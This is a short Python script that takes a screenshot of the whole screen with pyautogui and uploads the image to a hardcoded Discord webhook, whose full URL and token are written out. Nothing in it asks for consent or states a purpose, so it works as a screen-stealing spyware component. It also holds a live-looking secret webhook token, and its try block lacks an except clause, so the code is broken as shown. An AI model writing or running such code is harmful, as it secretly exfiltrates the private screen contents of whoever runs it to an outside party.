import pyautogui
import requests
import io
import os

def screenshot_pyautogui():
    try:
        screenshot = pyautogui.screenshot()
        
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format='PNG')
        img_bytes.seek(0)
        
        WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
        
        files = {'file': ('screenshot.png', img_bytes, 'image/png')}
        response = requests.post(WEBHOOK_URL, files=files, data={'content': '📸 Screenshot'})

if __name__ == "__main__":
    screenshot_pyautogui()
